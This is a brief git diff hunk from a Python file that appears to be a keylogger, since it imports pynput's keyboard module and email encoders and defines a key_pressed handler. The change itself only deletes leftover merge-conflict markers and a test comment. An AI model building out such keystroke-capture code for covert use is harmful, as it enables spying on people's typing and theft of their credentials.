@@ -6,11 +6,6 @@ from email import encoders
 from pynput import keyboard
 import datetime
 
-<<<<<<< HEAD
-#test...
-
-=======
->>>>>>> 03268eea8d08a6f78f5ab0a2c5036c26d25550e5
 def key_pressed(key):
     try:
         char = key.char
